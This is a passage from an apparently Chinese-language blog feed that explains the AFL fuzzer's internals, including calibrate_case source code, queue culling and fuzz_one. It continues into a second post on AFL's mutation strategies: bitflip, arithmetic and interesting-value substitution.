class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">static u8 calibrate_case(char** argv, struct queue_entry* q, u8* use_mem, u32 handicap, u8 from_queue) &#123;</span><br><span class="line">  static u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault &#x3D; 0, new_bits &#x3D; 0, var_detected &#x3D; 0,</span><br><span class="line">      first_run &#x3D; (q-&gt;exec_cksum &#x3D;&#x3D; 0);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc &#x3D; stage_cur, old_sm &#x3D; stage_max;</span><br><span class="line">  u32 use_tmout &#x3D; exec_tmout;</span><br><span class="line">  u8* old_sn &#x3D; stage_name;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="line">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="line">     to intermittent latency. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout &#x3D; MAX(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC &#x2F; 100);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; &quot;calibration&quot;;</span><br><span class="line">  stage_max  &#x3D; fast_cal ? 3 : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Make sure the forkserver is up before we do anything, and let&#39;s not</span><br><span class="line">     count its spin-up time toward binary calibration. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (dumb_mode !&#x3D; 1 &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    init_forkserver(argv);</span><br><span class="line"></span><br><span class="line">  if (q-&gt;exec_cksum) memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  start_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  for (stage_cur &#x3D; 0; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    if (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();</span><br><span class="line"></span><br><span class="line">    write_to_testcase(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault &#x3D; run_target(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    &#x2F;* stop_soon is set by the handler for Ctrl+C. When it&#39;s pressed,</span><br><span class="line">       we want to bail out quickly. *&#x2F;</span><br><span class="line"></span><br><span class="line">    if (stop_soon || fault !&#x3D; crash_mode) goto abort_calibration;</span><br><span class="line"></span><br><span class="line">    if (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;</span><br><span class="line">      fault &#x3D; FAULT_NOINST;</span><br><span class="line">      goto abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    if (q-&gt;exec_cksum !&#x3D; cksum) &#123;</span><br><span class="line"></span><br><span class="line">      u8 hnb &#x3D; has_new_bits(virgin_bits);</span><br><span class="line">      if (hnb &gt; new_bits) new_bits &#x3D; hnb;</span><br><span class="line"></span><br><span class="line">      if (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        for (i &#x3D; 0; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          if (!var_bytes[i] &amp;&amp; first_trace[i] !&#x3D; trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] &#x3D; 1;</span><br><span class="line">            stage_max    &#x3D; CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected &#x3D; 1;</span><br><span class="line"></span><br><span class="line">      &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum &#x3D; cksum;</span><br><span class="line">        memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  total_cal_us     +&#x3D; stop_us - start_us;</span><br><span class="line">  total_cal_cycles +&#x3D; stage_max;</span><br><span class="line"></span><br><span class="line">  &#x2F;* OK, let&#39;s collect some stats about the performance of this test case.</span><br><span class="line">     This is used for fuzzing air time calculations in calculate_score(). *&#x2F;</span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     &#x3D; (stop_us - start_us) &#x2F; stage_max;</span><br><span class="line">  q-&gt;bitmap_size &#x3D; count_bytes(trace_bits);</span><br><span class="line">  q-&gt;handicap    &#x3D; handicap;</span><br><span class="line">  q-&gt;cal_failed  &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size +&#x3D; q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  update_bitmap_score(q);</span><br><span class="line"></span><br><span class="line">  &#x2F;* If this case didn&#39;t result in new output from the instrumentation, tell</span><br><span class="line">     parent. This is a non-critical problem, but something to warn the user</span><br><span class="line">     about. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault &#x3D; FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  if (new_bits &#x3D;&#x3D; 2 &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov &#x3D; 1;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Mark variable paths. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count &#x3D; count_bytes(var_bytes);</span><br><span class="line"></span><br><span class="line">    if (!q-&gt;var_behavior) &#123;</span><br><span class="line">      mark_as_variable(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; old_sn;</span><br><span class="line">  stage_cur  &#x3D; old_sc;</span><br><span class="line">  stage_max  &#x3D; old_sm;</span><br><span class="line"></span><br><span class="line">  if (!first_run) show_stats();</span><br><span class="line"></span><br><span class="line">  return fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>calibrate_case</code>首先也会进行一些初始化操作，比较重要的是要检查一下 <code>fork_server</code>是否已经初始化，如果没有则先初始化 <code>fork_server</code>。每个测试样例都会执行3次或8次，而不是简单的执行一次，执行多次并记录tuple的信息。具体取决于是否快速校准</p><p><code>write_to_testcase()</code> ：将测试样例写入文件。如果 use_stdin 被清除了，那么取消旧文件链接并创建一个新文件。否则，prog_in_fd 将被缩短。将 testcase 写入到文件中去。</p><p><code>run_target()</code>：运行程序，见下文。</p><p><code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>：计算trace_bits的checksums，即当前tuple的hash值</p><p><code>if...else</code>：如果是第一次运行则记录<code>cksum</code>的值，下次将该次<code>cksum</code>的值和上一次进行比较，如果相同则忽略，如果不同则调用<code>has_new_bits()</code>和我们的总表<em>virgin_bits</em> 对比。</p><p>后续进行一些信息的记录</p><p><code>update_bitmap_score(q)</code> ：对这个测试用例的每一个byte进行排序，用一个top_rate[]来维护它的最佳入口。维护完成之后，我们这个函数在</p><p><strong>总结：</strong><code>calibratecase</code>该函数主要用途是<code>init_forkserver</code>，检查case的可用性，用update_bitmap_score进行初始的byte排序。</p><h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver()"></a>init_forkserver()</h2><p><a href="https://0xfocu5.github.io/posts/53fcd800/">记录在上一篇文章了</a></p><p><a href="https://0xfocu5.github.io/posts/53fcd800/">https://0xfocu5.github.io/posts/53fcd800/</a></p><h2 id="run-target"><a href="#run-target" class="headerlink" title="run_target()"></a>run_target()</h2><p><code>memset(trace_bits, 0, MAP_SIZE)</code>：清空共享内存</p><ul><li><p>如果是dumb模式：如果dumb_mode等于1，且no_forkserver，则直接fork出一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向trace_bits写入EXEC_FAIL_SIG</p></li><li><p>否则，就向控制管道写入<code>prev_timed_out</code>的值，命令Fork server开始fork出一个子进程进行fuzz，然后从状态管道读取fork server返回的fork出的子进程的ID到<code>child_pid</code></p></li></ul><p>接下来无论那种模式，如果超过用户所设置的超时时间限制，则杀死程序，并设置child_timed_out为1。</p><p>target执行结束，如果是dumb_mode，target执行结束的状态码将直接保存到status中，如果不是dumb_mode，则从状态管道中读取target执行结束的状态码。然后调用<code>classify_counts((u64 *) trace_bits)</code>去更新代码覆盖率。</p><h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits()"></a>has_new_bits()</h2><p>检查当前执行路径是否为表带来了新内容。更新原始位以反映发现。如果唯一更改的是特定元组的命中计数，则返回1;如果有新的元组出现，则返回2。更新映射，因此后续调用将始终返回0。<br>这个函数是在相当大的缓冲区上的每个exec()之后调用的，因此它需要非常快。我们以32位和64位的方式做这件事。因此它需要非常快。我们以32位和64位的方式做这件事。</p><h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>当碰到一条新路径时，我们将看这条路径是否比别的存在路径更加有利。“favorables”的目的是拥有一组最小的路径集（testcase）来触发到目前为止在位图中看到的所有位，并专注于fuzz这些testcase，而牺牲了其余的。这个过程的第一步是bitmap中的每个字节维护一个top_rating[]条目列表。</p><ul><li><p>首先计算出这个case的fav_factor，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即执行时间和样例大小的乘积，以这两个指标来衡量权重。</p></li><li><p>遍历trace_bits数组，如果该字节的值不为0，则代表这是已经被覆盖到的path</p><p>  然后检查对应于这个path的top_rated是否存在</p><ul><li><p><code>static struct queue_entry *top_rated[MAP_SIZE]; /* Top entries for bitmap bytes */</code></p></li><li><p>如果存在，就比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行时间和样例大小的乘积，哪个更小。</p><ul><li>如果<code>top_rated[i]</code>的更小，则代表<code>top_rated[i]</code>的更优，不做任何处理，继续遍历下一个path。</li><li>如果q更小，就将<code>top_rated[i]</code>原先对应的queue entry的tc_ref字段减一，并将其trace_mini字段置为空。</li><li><code>u8 *trace_mini; /* Trace bytes, if kept */</code></li><li><code>u32 tc_ref; /* Trace bytes ref count */</code></li></ul></li><li><p>然后设置<code>top_rated[i]</code>为q，即当前case，然后将其tc_ref的值加一</p></li><li><p>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过minimize_bits压缩，然后存到trace_mini字段里</p></li><li><p>设置score_changed为1.</p></li></ul></li></ul><h1 id="fuzz循环"><a href="#fuzz循环" class="headerlink" title="fuzz循环"></a>fuzz循环</h1><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h2><p>精简队列。</p><blockquote><p>为了优化模糊工作，AFL使用快速算法定期重新评估队列，该算法选择一个较小的测试用例子集，该子集仍覆盖到目前为止所看到的每个元组，并且其特征使它们对Fuzzing特别有利。该算法通过为每个队列条目分配与其执行延迟和文件大小成正比的分数来工作;然后为每个tuples选择最低得分候选者。<br>cull_queue()遍历top_rated[]中的queue，然后提取出发现新的edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。<br>这里本质上采用了贪婪算法，如果top_rated[i]存在，且对应temp_v[]中对应bit位还没抹去，即这一轮选出的queue还没覆盖bit_map[i]对应的边，则取出这个top_rated[i]。抹去temp_v中top_rated[i]能访问到的位。最后将这个top_rated[i]标记为favored,如果这个queue还没fuzzed，pending_favored++.</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><code>static void show_init_stats(void)</code>在处理输入目录的末尾显示快速统计信息，并添加一系列警告。<br> 一些校准的东西也在这里结束了，还有一些硬编码的常量。也许最终会清理干净。</li><li><code>static u32 find_start_position(void)</code>在恢复时，尝试找到要开始的队列位置。只有在恢复时，以及在可以找到原始fuzzer_stats时，这才有意义。</li><li><code>static void write_stats_file(double bitmap_cvg, double stability, double eps)</code>更新一些状态稳健。</li><li><code>static void save_auto(void)</code>自动更新token，目录/queue/.state/auto<em>extras/auto</em>。</li><li>循环开始前，调用<code>cull_queue()</code> 对queue进行筛选</li></ol><h2 id="while-1"><a href="#while-1" class="headerlink" title="while(1)"></a>while(1)</h2><ol><li>判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</li><li>找到queue入口的testcase，seek_to = find_start_position()；直接跳到该testcase</li><li>如果一整个队列循环都没新发现，尝试重组策略。</li><li>调用关键函数fuzz_one()对该testcase进行fuzz。fuzz_one()函数参见3.4。</li><li>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</li></ol><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one()"></a>fuzz_one()</h2><p><code>static u8 fuzz_one_original(char** argv)</code>从队列中取出当前testcase并模糊。这个函数太长了…如果fuzzed成功，返回0;如果跳过或退出，返回1。<br><strong>步骤：</strong></p><ol><li><p>根据是否有pending_favored和queue_cur的情况按照概率进行跳过；有pending_favored, 对于fuzz过的或者non-favored的以概率99%跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored。</p></li><li><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case进行测试。</p></li><li><p>如果测试用例没有修剪过，那么调用函数<code>trim_case</code>对测试用例进行修剪。</p></li><li><p>修剪完毕之后，使用<code>calculate_score</code>对每个测试用例进行打分。</p></li><li><p>如果该queue已经完成deterministic阶段，则直接跳到havoc阶段</p></li><li><p>deterministic阶段变异4个stage，变异过程中会多次调用函数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">common_fuzz_stuff</span><br></pre></td></tr></table></figure><p> 保存interesting 的种子：</p><blockquote><p>bitflip，按位翻转，1变为0，0变为1<br>arithmetic，整数加/减算术运算<br>interest，把一些特殊内容替换到原文件中<br>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></blockquote></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异。</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件。</p></li><li><p>该 testcase完成。 The </p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hicookie.me/2019/09/18/AFL-Learning/">https://hicookie.me/2019/09/18/AFL-Learning/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-12">https://xz.aliyun.com/t/4628#toc-12</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 变异原理</title>
      <link href="posts/20f730a9/"/>
      <url>posts/20f730a9/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="http://rk700.github.io/2018/01/04/afl-mutations/">http://rk700.github.io/2018/01/04/afl-mutations/</a></p><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ul><li>bitflip，按位翻转，1变为0，0变为1</li><li>arithmetic，整数加/减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换/插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul><p>其中，前四项bitflip, arithmetic, interest, dictionary是非dumb mode（<code>-d</code>）和主fuzzer（<code>-M</code>）会进行的操作，由于其变异方式没有随机性，所以也称为deterministic fuzzing；havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p>以下将对这些变异类型进行具体介绍。</p><h1 id="bitflip"><a href="#bitflip" class="headerlink" title="bitflip"></a>bitflip</h1><p>拿到一个原始文件，打头阵的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转<strong>1</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的<strong>2</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的<strong>4</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的<strong>8</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个byte做翻转</li><li>bitflip 16/8，每次翻转相邻的<strong>16</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的<strong>32</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p>作为精妙构思的fuzzer，AFL不会放过每一个获取文件信息的机会。这一点在bitflip过程中就体现的淋漓尽致。具体地，在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断。</p><h2 id="自动检测token"><a href="#自动检测token" class="headerlink" title="自动检测token"></a>自动检测token</h2><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致(检测程序执行路径的方式可见上篇文章中<a href="https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90">“分支信息的分析”</a>一节)，那么就把这一段连续的bytes判断是一条token。</p><p>例如，PNG文件中用<code>IHDR</code>作为起始块的标识，那么就会存在类似于以下的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">........IHDR........</span><br></pre></td></tr></table></figure><p>当翻转到字符<code>I</code>的最高位时，因为<code>IHDR</code>被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，<code>IHDR</code>标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：<code>IHDR</code>，并将其记录下来为后面的变异提供备选。</p><p>AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在<code>config.h</code>中通过宏定义了限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Length limits for auto-detected dictionary tokens: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 </span><br><span class="line">&#x2F;* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define USE_AUTO_EXTRAS 10 </span><br><span class="line">#define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10)</span><br></pre></td></tr></table></figure><p>对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改<code>MAX_AUTO_EXTRA</code>为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。</p><h2 id="生成effector-map"><a href="#生成effector-map" class="headerlink" title="生成effector map"></a>生成effector map</h2><p>在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。</p><p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</p><p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</p><p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Minimum input file length at which the effector logic kicks in: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MIN_LEN 128 </span><br><span class="line">&#x2F;* Maximum effector density past which everything is just fuzzed unconditionally (%): *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MAX_PERC 90</span><br></pre></td></tr></table></figure><p>即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。</p><h1 id="arithmetic"><a href="#arithmetic" class="headerlink" title="arithmetic"></a>arithmetic</h1><p>在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段：</p><ul><li>arith 8/8，每次对<strong>8</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对<strong>16</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对<strong>32</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减变异的上限，在<code>config.h</code>中的宏<code>ARITH_MAX</code>定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p><p>此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><h1 id="interest"><a href="#interest" class="headerlink" title="interest"></a>interest</h1><p>下一个阶段是interest，具体可分为：</p><ul><li>interest 8/8，每次对<strong>8</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对<strong>16</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对<strong>32</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>而用于替换的”interesting values”，是AFL预设的一些比较特殊的数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static s8  interesting_8[]  &#x3D; &#123; INTERESTING_8 &#125;;</span><br><span class="line">static s16 interesting_16[] &#x3D; &#123; INTERESTING_8, INTERESTING_16 &#125;;</span><br><span class="line">static s32 interesting_32[] &#x3D; &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;</span><br></pre></td></tr></table></figure><p>这些数的定义在<code>config.h</code>文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* List of interesting values to use in fuzzing. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define INTERESTING_8 \ -128, &#x2F;* Overflow signed 8-bit when decremented *&#x2F; \ -1, &#x2F;* *&#x2F; \ 0, &#x2F;* *&#x2F; \ 1, &#x2F;* *&#x2F; \ 16, &#x2F;* One-off with common buffer size *&#x2F; \ 32, &#x2F;* One-off with common buffer size *&#x2F; \ 64, &#x2F;* One-off with common buffer size *&#x2F; \ 100, &#x2F;* One-off with common buffer size *&#x2F; \ 127 &#x2F;* Overflow signed 8-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_16 \ -32768, &#x2F;* Overflow signed 16-bit when decremented *&#x2F; \ -129, &#x2F;* Overflow signed 8-bit *&#x2F; \ 128, &#x2F;* Overflow signed 8-bit *&#x2F; \ 255, &#x2F;* Overflow unsig 8-bit when incremented *&#x2F; \ 256, &#x2F;* Overflow unsig 8-bit *&#x2F; \ 512, &#x2F;* One-off with common buffer size *&#x2F; \ 1000, &#x2F;* One-off with common buffer size *&#x2F; \ 1024, &#x2F;* One-off with common buffer size *&#x2F; \ 4096, &#x2F;* One-off with common buffer size *&#x2F; \ 32767 &#x2F;* Overflow signed 16-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_32 \ -2147483648LL, &#x2F;* Overflow signed 32-bit when decremented *&#x2F; \ -100663046, &#x2F;* Large negative number (endian-agnostic) *&#x2F; \ -32769, &#x2F;* Overflow signed 16-bit *&#x2F; \ 32768, &#x2F;* Overflow signed 16-bit *&#x2F; \ 65535, &#x2F;* Overflow unsig 16-bit when incremented *&#x2F; \ 65536, &#x2F;* Overflow unsig 16 bit *&#x2F; \ 100663045, &#x2F;* Large positive number (endian-agnostic) *&#x2F; \ 2147483647 &#x2F;* Overflow signed 32-bit when incremented *&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到，用于替换的基本都是可能会造成溢出的数。</p><p>与之前类似，effector map仍然会用于判断是否需要变异；此外，如果某个interesting value，是可以通过bitflip或者arithmetic变异达到，那么这样的重复性变异也是会跳过的。</p><h1 id="dictionary"><a href="#dictionary" class="headerlink" 